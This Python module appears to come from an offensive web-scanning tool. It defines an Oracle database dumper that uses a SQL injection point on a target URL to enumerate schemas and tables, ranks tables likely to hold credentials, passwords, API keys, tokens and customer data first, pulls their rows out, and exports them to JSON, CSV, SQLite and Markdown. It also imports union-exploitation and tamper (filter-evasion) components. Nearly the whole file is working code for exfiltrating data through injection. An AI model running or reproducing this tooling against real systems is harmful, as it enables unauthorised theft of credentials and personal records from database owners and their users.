# app/modules/scanner/database_dumper.py
"""
Automatic Database Dumper for SentinelAI.
Phase 17: Enterprise-grade Database Dumping
"""

import csv
import json
import logging
import sqlite3
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

import requests

from .oracle_database import OracleDatabaseEnumerator
from .oracle_extractor import OracleDataExtractor
from .oracle_schema import OracleSchemaEnumerator
from .tamper_engine import TamperEngine
from .union_exploiter import OracleUnionExploiter

# ============================================================
# Data Classes
# ============================================================


@dataclass
class DatabaseDumpResult:
    """
    Database dump result.
    Contains comprehensive dumping information.
    """

    success: bool = False
    schemas_dumped: int = 0
    tables_dumped: int = 0
    rows_dumped: int = 0
    total_rows: int = 0
    dump_time: float = 0.0
    tables: dict[str, dict[str, list[dict[str, Any]]]] = field(default_factory=dict)
    schema_names: list[str] = field(default_factory=list)
    table_names: list[str] = field(default_factory=list)
    errors: list[str] = field(default_factory=list)
    skipped_tables: list[str] = field(default_factory=list)
    progress: dict[str, Any] = field(default_factory=dict)
    export_paths: dict[str, str] = field(default_factory=dict)

    def add_error(self, error: str):
        """Add an error to the result."""
        if error and error not in self.errors:
            self.errors.append(error)

    def add_table_data(self, schema: str, table: str, rows: list[dict[str, Any]]):
        """Add table data to the result."""
        if schema not in self.tables:
            self.tables[schema] = {}
        self.tables[schema][table] = rows
        self.table_names.append(f"{schema}.{table}")
        self.rows_dumped += len(rows)

    def get_summary(self) -> str:
        """Get a summary of the dump result."""
        if not self.success:
            return "Database dump failed"

        parts = []
        parts.append(f"Schemas: {self.schemas_dumped}")
        parts.append(f"Tables: {self.tables_dumped}")
        parts.append(f"Rows: {self.rows_dumped}")
        if self.total_rows > 0:
            parts.append(f"Total rows: {self.total_rows}")
        parts.append(f"Time: {self.dump_time:.2f}s")
        if self.errors:
            parts.append(f"Errors: {len(self.errors)}")
        if self.skipped_tables:
            parts.append(f"Skipped: {len(self.skipped_tables)}")

        return f"Dump: {', '.join(parts)}"

    def to_dict(self) -> dict[str, Any]:
        """Convert to dictionary for logging/output."""
        return {
            "success": self.success,
            "schemas_dumped": self.schemas_dumped,
            "tables_dumped": self.tables_dumped,
            "rows_dumped": self.rows_dumped,
            "total_rows": self.total_rows,
            "dump_time": self.dump_time,
            "schema_names": self.schema_names,
            "table_names": self.table_names,
            "errors": self.errors,
            "skipped_tables": self.skipped_tables,
            "progress": self.progress,
            "export_paths": self.export_paths,
            "summary": self.get_summary(),
        }


# ============================================================
# Main Database Dumper Class
# ============================================================


class OracleDatabaseDumper:
    """
    Oracle Automatic Database Dumper.
    Phase 17: Enterprise-grade database dumping.
    """

    # ============================================================
    # Constants
    # ============================================================

    # Sensitive tables (priority order)
    SENSITIVE_TABLES = [
        "USERS",
        "USER",
        "ACCOUNTS",
        "ACCOUNT",
        "LOGIN",
        "EMPLOYEES",
        "EMPLOYEE",
        "CUSTOMERS",
        "CUSTOMER",
        "ADMIN",
        "ADMINS",
        "ADMINISTRATOR",
        "ADMINISTRATORS",
        "CREDENTIALS",
        "CREDENTIAL",
        "PASSWORDS",
        "PASSWORD",
        "PROFILES",
        "PROFILE",
        "MEMBERS",
        "MEMBER",
        "AUTH",
        "AUTHENTICATION",
        "SESSION",
        "TOKENS",
        "API_KEYS",
        "API_KEY",
        "SECRETS",
        "SECRET",
    ]

    # Default blacklist (system tables to skip)
    DEFAULT_BLACKLIST = [
        "SYS",
        "SYSTEM",
        "DBSNMP",
        "XDB",
        "OUTLN",
        "MDSYS",
        "CTXSYS",
        "DMSYS",
        "EXFSYS",
        "LBACSYS",
        "ODM",
        "ODM_MTR",
        "OE",
        "OLAPSYS",
        "ORDPLUGINS",
        "ORDSYS",
        "OUTLN",
        "SI_INFORMTN_SCHEMA",
        "SQL_MONITOR",
        "SYS",
        "SYSMAN",
        "SYSTEM",
        "TSMSYS",
        "WMSYS",
        "XDB",
        "DBA_%",
        "V$%",
        "GV$%",
        "ALL_%",
        "USER_%",
    ]

    # ============================================================
    # Initialization
    # ============================================================

    def __init__(
        self,
        session: requests.Session,
        base_url: str,
        injection_point: str,
        logger: logging.Logger | None = None,
    ):
        """
        Initialize Oracle Database Dumper.

        Args:
            session: Requests session for HTTP requests
            base_url: Target base URL
            injection_point: Parameter to inject into
            logger: Optional logger instance
        """
        self.session = session
        self.base_url = base_url
        self.injection_point = injection_point
        self.logger = logger or self._setup_logger()

        # Initialize components
        self.schema_enumerator = OracleSchemaEnumerator(session, base_url, logger)
        self.data_extractor = OracleDataExtractor(session, base_url, logger)
        self.database_enumerator = OracleDatabaseEnumerator(session, base_url, logger)
        self.union_exploiter = OracleUnionExploiter(session, base_url, logger)
        self.tamper_engine = TamperEngine(logger)

        # State
        self.dump_result = None
        self.current_progress = {
            "total_tables": 0,
            "completed_tables": 0,
            "total_rows": 0,
            "dumped_rows": 0,
            "start_time": 0,
            "elapsed_time": 0,
        }

        self.logger.info("[DatabaseDumper] Module initialized for database dumping")
        self.logger.info(f"[DatabaseDumper] Target: {base_url}")
        self.logger.info(f"[DatabaseDumper] Injection point: {injection_point}")

    def _setup_logger(self) -> logging.Logger:
        """Set up default logger."""
        logger = logging.getLogger("DatabaseDumper")
        logger.setLevel(logging.DEBUG)

        if not logger.handlers:
            ch = logging.StreamHandler()
            ch.setLevel(logging.DEBUG)
            formatter = logging.Formatter(
                "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
            )
            ch.setFormatter(formatter)
            logger.addHandler(ch)

        return logger

    # ============================================================
    # Private Methods
    # ============================================================

    def _is_blacklisted(self, table: str, blacklist: set[str]) -> bool:
        """Check if a table is blacklisted."""
        table_upper = table.upper()
        for pattern in blacklist:
            if pattern.endswith("%"):
                if table_upper.startswith(pattern[:-1]):
                    return True
            elif pattern.startswith("%") and pattern.endswith("%"):
                if pattern[1:-1] in table_upper:
                    return True
            elif table_upper == pattern:
                return True
        return False

    def _get_priority_tables(self, tables: list[str]) -> list[str]:
        """Get tables sorted by priority."""
        priority_tables = []
        other_tables = []

        for table in tables:
            table_upper = table.upper()
            if any(sensitive in table_upper for sensitive in self.SENSITIVE_TABLES):
                priority_tables.append(table)
            else:
                other_tables.append(table)

        # Priority tables first, then alphabetical
        priority_tables.sort(
            key=lambda x: (
                -max(
                    self.SENSITIVE_TABLES.index(t) if t in x.upper() else 999
                    for t in self.SENSITIVE_TABLES
                ),
                x,
            )
        )
        other_tables.sort()

        return priority_tables + other_tables

    def _estimate_rows(self, schema: str, table: str) -> int:
        """Estimate row count for a table."""
        try:
            # Try to get row count from schema result
            if self.schema_enumerator.schema_result:
                return -1  # Unknown
            return -1
        except Exception:
            return -1

    def _update_progress(self, table: str, rows: int):
        """Update dump progress."""
        self.current_progress["completed_tables"] += 1
        self.current_progress["dumped_rows"] += rows
        self.current_progress["elapsed_time"] = (
            time.time() - self.current_progress["start_time"]
        )

        if self.current_progress["total_rows"] > 0:
            progress_pct = (
                self.current_progress["dumped_rows"]
                / self.current_progress["total_rows"]
            ) * 100
        else:
            progress_pct = (
                self.current_progress["completed_tables"]
                / self.current_progress["total_tables"]
            ) * 100

        self.logger.info(
            f"[DatabaseDumper] Progress: {progress_pct:.1f}% - Table: {table} - Rows: {rows}"
        )

    # ============================================================
    # Discovery Methods
    # ============================================================

    def discover_targets(
        self,
        max_schemas: int = 20,
        max_tables: int = 50,
        blacklist: set[str] | None = None,
        whitelist: set[str] | None = None,
        prioritize_sensitive: bool = True,
    ) -> dict[str, list[str]]:
        """
        Discover schemas and tables to dump.

        Args:
            max_schemas: Maximum schemas to discover
            max_tables: Maximum tables per schema
            blacklist: Tables to skip
            whitelist: Tables to include
            prioritize_sensitive: Prioritize sensitive tables

        Returns:
            Dict[str, List[str]]: Dictionary mapping schemas to table lists
        """
        self.logger.info("[DatabaseDumper] Discovering targets...")

        blacklist = blacklist or set(self.DEFAULT_BLACKLIST)
        whitelist = whitelist or set()

        result = {}

        try:
            # Get schemas
            schema_result = self.schema_enumerator.enumerate_schemas(
                self.injection_point
            )

            if not schema_result:
                self.logger.warning("[DatabaseDumper] No schemas discovered")
                return result

            schemas = schema_result[:max_schemas]
            self.logger.info(f"[DatabaseDumper] Found {len(schemas)} schemas")

            for schema in schemas:
                tables = []

                try:
                    # Get tables for schema
                    table_list = self.schema_enumerator.enumerate_tables(
                        self.injection_point, schema
                    )

                    if not table_list:
                        continue

                    # Apply filters
                    for table in table_list:
                        table_upper = table.upper()

                        # Check whitelist
                        if whitelist and table_upper not in whitelist:
                            continue

                        # Check blacklist
                        if self._is_blacklisted(table, blacklist):
                            continue

                        tables.append(table)

                    # Prioritize sensitive tables
                    if prioritize_sensitive:
                        tables = self._get_priority_tables(tables)

                    # Limit tables
                    if len(tables) > max_tables:
                        tables = tables[:max_tables]

                    if tables:
                        result[schema] = tables
                        self.logger.info(
                            f"[DatabaseDumper] Schema {schema}: {len(tables)} tables"
                        )

                except Exception as e:
                    self.logger.warning(
                        f"[DatabaseDumper] Failed to enumerate tables for {schema}: {e!s}"
                    )

        except Exception as e:
            self.logger.error(f"[DatabaseDumper] Target discovery failed: {e!s}")

        self.logger.info(
            f"[DatabaseDumper] Discovered {len(result)} schemas with tables"
        )
        return result

    # ============================================================
    # Dump Methods
    # ============================================================

    def dump_schema(
        self,
        schema: str,
        tables: list[str] | None = None,
        max_rows: int | None = None,
        resume: bool = False,
    ) -> dict[str, list[dict[str, Any]]]:
        """
        Dump all tables in a schema.

        Args:
            schema: Schema name
            tables: Optional list of tables to dump
            max_rows: Maximum rows per table
            resume: Resume interrupted dump

        Returns:
            Dict[str, List[Dict[str, Any]]]: Table data
        """
        self.logger.info(f"[DatabaseDumper] Dumping schema: {schema}")

        result = {}
        start_time = time.time()

        try:
            # Get tables if not provided
            if not tables:
                tables = self.schema_enumerator.enumerate_tables(
                    self.injection_point, schema
                )

            if not tables:
                self.logger.warning(
                    f"[DatabaseDumper] No tables found in schema: {schema}"
                )
                return result

            self.logger.info(
                f"[DatabaseDumper] Schema {schema}: {len(tables)} tables to dump"
            )

            for table in tables:
                try:
                    self.logger.info(f"[DatabaseDumper] Dumping {schema}.{table}...")

                    # Check if we should resume
                    if resume and table in result and result[table]:
                        self.logger.info(
                            f"[DatabaseDumper] Skipping {schema}.{table} (already dumped)"
                        )
                        continue

                    # Extract data
                    extract_result = self.data_extractor.extract_table(
                        self.injection_point, schema, table, max_rows=max_rows
                    )

                    if extract_result.success and extract_result.rows:
                        result[table] = extract_result.rows
                        self.logger.info(
                            f"[DatabaseDumper] Dumped {len(extract_result.rows)} rows from {schema}.{table}"
                        )
                    else:
                        self.logger.warning(
                            f"[DatabaseDumper] No data extracted from {schema}.{table}"
                        )
                        result[table] = []

                except Exception as e:
                    self.logger.error(
                        f"[DatabaseDumper] Failed to dump {schema}.{table}: {e!s}"
                    )
                    result[table] = []

        except Exception as e:
            self.logger.error(f"[DatabaseDumper] Schema dump failed: {e!s}")

        elapsed = time.time() - start_time
        self.logger.info(
            f"[DatabaseDumper] Schema dump complete: {schema} ({elapsed:.2f}s)"
        )

        return result

    def dump_table(
        self, schema: str, table: str, max_rows: int | None = None
    ) -> list[dict[str, Any]]:
        """
        Dump a single table.

        Args:
            schema: Schema name
            table: Table name
            max_rows: Maximum rows to dump

        Returns:
            List[Dict[str, Any]]: Table data
        """
        self.logger.info(f"[DatabaseDumper] Dumping table: {schema}.{table}")

        try:
            extract_result = self.data_extractor.extract_table(
                self.injection_point, schema, table, max_rows=max_rows
            )

            if extract_result.success and extract_result.rows:
                self.logger.info(
                    f"[DatabaseDumper] Dumped {len(extract_result.rows)} rows from {schema}.{table}"
                )
                return extract_result.rows
            else:
                self.logger.warning(
                    f"[DatabaseDumper] No data extracted from {schema}.{table}"
                )
                return []

        except Exception as e:
            self.logger.error(
                f"[DatabaseDumper] Failed to dump {schema}.{table}: {e!s}"
            )
            return []

    def dump_multiple_tables(
        self, schema: str, tables: list[str], max_rows: int | None = None
    ) -> dict[str, list[dict[str, Any]]]:
        """
        Dump multiple tables from a schema.

        Args:
            schema: Schema name
            tables: List of table names
            max_rows: Maximum rows per table

        Returns:
            Dict[str, List[Dict[str, Any]]]: Table data
        """
        self.logger.info(f"[DatabaseDumper] Dumping {len(tables)} tables from {schema}")

        result = {}

        for table in tables:
            try:
                table_data = self.dump_table(schema, table, max_rows)
                result[table] = table_data
            except Exception as e:
                self.logger.error(
                    f"[DatabaseDumper] Failed to dump {schema}.{table}: {e!s}"
                )
                result[table] = []

        return result

    def dump_database(
        self,
        max_schemas: int = 20,
        max_tables: int = 50,
        max_rows: int | None = None,
        blacklist: set[str] | None = None,
        whitelist: set[str] | None = None,
        prioritize_sensitive: bool = True,
        resume: bool = False,
    ) -> DatabaseDumpResult:
        """
        Dump the entire database.

        Args:
            max_schemas: Maximum schemas to dump
            max_tables: Maximum tables per schema
            max_rows: Maximum rows per table
            blacklist: Tables to skip
            whitelist: Tables to include
            prioritize_sensitive: Prioritize sensitive tables
            resume: Resume interrupted dump

        Returns:
            DatabaseDumpResult: Complete dump result
        """
        self.logger.info(
            "[DatabaseDumper] =================================================="
        )
        self.logger.info("[DatabaseDumper] PHASE 17: Database Dump")
        self.logger.info(
            "[DatabaseDumper] =================================================="
        )

        result = DatabaseDumpResult()
        total_start = time.time()

        # Initialize progress
        self.current_progress["start_time"] = total_start

        try:
            # Step 1: Discover targets
            self.logger.info("[DatabaseDumper] Step 1: Discovering targets...")
            targets = self.discover_targets(
                max_schemas=max_schemas,
                max_tables=max_tables,
                blacklist=blacklist,
                whitelist=whitelist,
                prioritize_sensitive=prioritize_sensitive,
            )

            if not targets:
                result.add_error("No targets discovered")
                return result

            # Calculate totals
            total_tables = sum(len(tables) for tables in targets.values())
            self.current_progress["total_tables"] = total_tables
            result.schemas_dumped = len(targets)
            result.tables_dumped = total_tables
            result.schema_names = list(targets.keys())

            self.logger.info(f"[DatabaseDumper] Total tables to dump: {total_tables}")

            # Step 2: Dump each schema
            self.logger.info("[DatabaseDumper] Step 2: Dumping schemas...")

            for schema, tables in targets.items():
                self.logger.info(
                    f"[DatabaseDumper] Dumping schema: {schema} ({len(tables)} tables)"
                )

                schema_data = self.dump_multiple_tables(schema, tables, max_rows)

                for table, rows in schema_data.items():
                    if rows:
                        result.add_table_data(schema, table, rows)
                        self._update_progress(f"{schema}.{table}", len(rows))
                    else:
                        self.logger.warning(
                            f"[DatabaseDumper] No data for {schema}.{table}"
                        )

            result.success = True
            result.total_rows = result.rows_dumped

            self.logger.info(
                f"[DatabaseDumper] Dumped {result.rows_dumped} rows from {result.tables_dumped} tables"
            )

        except Exception as e:
            error_msg = f"Database dump failed: {e!s}"
            self.logger.error(error_msg)
            result.add_error(error_msg)
            result.success = False

        result.dump_time = time.time() - total_start

        self.logger.info(
            "[DatabaseDumper] =================================================="
        )
        self.logger.info("[DatabaseDumper] DATABASE DUMP COMPLETE")
        self.logger.info(f"[DatabaseDumper] {result.get_summary()}")
        self.logger.info(f"[DatabaseDumper] Time: {result.dump_time:.2f}s")
        self.logger.info(
            "[DatabaseDumper] =================================================="
        )

        self.dump_result = result
        return result

    # ============================================================
    # Resume Methods
    # ============================================================

    def resume_dump(self, previous_result: DatabaseDumpResult) -> DatabaseDumpResult:
        """
        Resume an interrupted dump.

        Args:
            previous_result: Previous dump result

        Returns:
            DatabaseDumpResult: Completed dump result
        """
        self.logger.info("[DatabaseDumper] Resuming interrupted dump...")

        if not previous_result.tables:
            self.logger.warning("[DatabaseDumper] No previous tables to resume")
            return previous_result

        # Extract tables already dumped
        dumped_tables = set()
        for schema, tables in previous_result.tables.items():
            for table, rows in tables.items():
                if rows:
                    dumped_tables.add(f"{schema}.{table}")

        self.logger.info(f"[DatabaseDumper] Already dumped {len(dumped_tables)} tables")

        # Resume dumping
        return self.dump_database(max_schemas=20, max_tables=50, resume=True)

    # ============================================================
    # Export Methods
    # ============================================================

    def export_json(self, result: DatabaseDumpResult, output_path: str) -> str:
        """
        Export dump to JSON.

        Args:
            result: Dump result
            output_path: Output file path

        Returns:
            str: Output file path
        """
        self.logger.info(f"[DatabaseDumper] Exporting to JSON: {output_path}")

        try:
            data = {
                "metadata": {
                    "schemas_dumped": result.schemas_dumped,
                    "tables_dumped": result.tables_dumped,
                    "rows_dumped": result.rows_dumped,
                    "dump_time": result.dump_time,
                    "timestamp": time.time(),
                },
                "tables": result.tables,
            }

            with open(output_path, "w") as f:
                json.dump(data, f, indent=2, default=str)

            self.logger.info(f"[DatabaseDumper] JSON export complete: {output_path}")
            result.export_paths["json"] = output_path
            return output_path

        except Exception as e:
            self.logger.error(f"[DatabaseDumper] JSON export failed: {e!s}")
            return ""

    def export_csv(self, result: DatabaseDumpResult, output_dir: str) -> list[str]:
        """
        Export dump to CSV files.

        Args:
            result: Dump result
            output_dir: Output directory

        Returns:
            List[str]: Output file paths
        """
        self.logger.info(f"[DatabaseDumper] Exporting to CSV: {output_dir}")

        output_files = []
        Path(output_dir).mkdir(parents=True, exist_ok=True)

        try:
            for schema, tables in result.tables.items():
                for table, rows in tables.items():
                    if not rows:
                        continue

                    filename = f"{schema}_{table}.csv"
                    filepath = Path(output_dir) / filename

                    with open(filepath, "w", newline="", encoding="utf-8") as f:
                        if rows:
                            writer = csv.DictWriter(f, fieldnames=rows[0].keys())
                            writer.writeheader()
                            writer.writerows(rows)

                    output_files.append(str(filepath))
                    self.logger.info(f"[DatabaseDumper] Exported {table} to {filepath}")

            result.export_paths["csv"] = output_dir
            return output_files

        except Exception as e:
            self.logger.error(f"[DatabaseDumper] CSV export failed: {e!s}")
            return []

    def export_sqlite(self, result: DatabaseDumpResult, output_path: str) -> str:
        """
        Export dump to SQLite database.

        Args:
            result: Dump result
            output_path: Output file path

        Returns:
            str: Output file path
        """
        self.logger.info(f"[DatabaseDumper] Exporting to SQLite: {output_path}")

        try:
            conn = sqlite3.connect(output_path)
            cursor = conn.cursor()

            for schema, tables in result.tables.items():
                for table, rows in tables.items():
                    if not rows:
                        continue

                    # Create table
                    columns = rows[0].keys()
                    column_defs = []
                    for col in columns:
                        # Use TEXT for all columns (simplified)
                        column_defs.append(f'"{col}" TEXT')

                    create_sql = f'CREATE TABLE IF NOT EXISTS "{schema}_{table}" ({", ".join(column_defs)})'
                    cursor.execute(create_sql)

                    # Insert data
                    placeholders = ",".join(["?" for _ in columns])
                    insert_sql = f'INSERT INTO "{schema}_{table}" ({", ".join([f'"{c}"' for c in columns])}) VALUES ({placeholders})'

                    for row in rows:
                        values = [row.get(col) for col in columns]
                        cursor.execute(insert_sql, values)

                    self.logger.info(f"[DatabaseDumper] Exported {table} to SQLite")

            conn.commit()
            conn.close()

            self.logger.info(f"[DatabaseDumper] SQLite export complete: {output_path}")
            result.export_paths["sqlite"] = output_path
            return output_path

        except Exception as e:
            self.logger.error(f"[DatabaseDumper] SQLite export failed: {e!s}")
            return ""

    def export_markdown(self, result: DatabaseDumpResult, output_path: str) -> str:
        """
        Export dump to Markdown.

        Args:
            result: Dump result
            output_path: Output file path

        Returns:
            str: Output file path
        """
        self.logger.info(f"[DatabaseDumper] Exporting to Markdown: {output_path}")

        try:
            with open(output_path, "w", encoding="utf-8") as f:
                f.write("# Database Dump Report\n\n")
                f.write("## Metadata\n\n")
                f.write(f"- Schemas dumped: {result.schemas_dumped}\n")
                f.write(f"- Tables dumped: {result.tables_dumped}\n")
                f.write(f"- Rows dumped: {result.rows_dumped}\n")
                f.write(f"- Dump time: {result.dump_time:.2f}s\n\n")

                for schema, tables in result.tables.items():
                    f.write(f"## Schema: {schema}\n\n")

                    for table, rows in tables.items():
                        f.write(f"### Table: {table}\n\n")
                        f.write(f"Rows: {len(rows)}\n\n")

                        if rows:
                            # Table header
                            headers = rows[0].keys()
                            f.write("| " + " | ".join(headers) + " |\n")
                            f.write("| " + " | ".join(["---"] * len(headers)) + " |\n")

                            # Table rows (limit to 50 for readability)
                            for row in rows[:50]:
                                values = [str(row.get(col, ""))[:50] for col in headers]
                                f.write("| " + " | ".join(values) + " |\n")

                            if len(rows) > 50:
                                f.write(f"\n*... and {len(rows) - 50} more rows*\n")

                        f.write("\n")

            self.logger.info(
                f"[DatabaseDumper] Markdown export complete: {output_path}"
            )
            result.export_paths["markdown"] = output_path
            return output_path

        except Exception as e:
            self.logger.error(f"[DatabaseDumper] Markdown export failed: {e!s}")
            return ""

    # ============================================================
    # Progress Methods
    # ============================================================

    def track_progress(self) -> dict[str, Any]:
        """
        Track current dump progress.

        Returns:
            Dict[str, Any]: Progress information
        """
        progress = self.current_progress.copy()

        if progress["total_rows"] > 0:
            progress["percentage"] = (
                progress["dumped_rows"] / progress["total_rows"]
            ) * 100
        elif progress["total_tables"] > 0:
            progress["percentage"] = (
                progress["completed_tables"] / progress["total_tables"]
            ) * 100
        else:
            progress["percentage"] = 0

        if progress["elapsed_time"] > 0 and progress["dumped_rows"] > 0:
            rate = progress["dumped_rows"] / progress["elapsed_time"]
            remaining_rows = max(0, progress["total_rows"] - progress["dumped_rows"])
            progress["estimated_remaining"] = remaining_rows / rate if rate > 0 else 0
        else:
            progress["estimated_remaining"] = -1

        return progress

    def estimate_remaining_time(self) -> float:
        """
        Estimate remaining dump time.

        Returns:
            float: Estimated remaining time in seconds
        """
        progress = self.track_progress()
        return progress.get("estimated_remaining", -1)
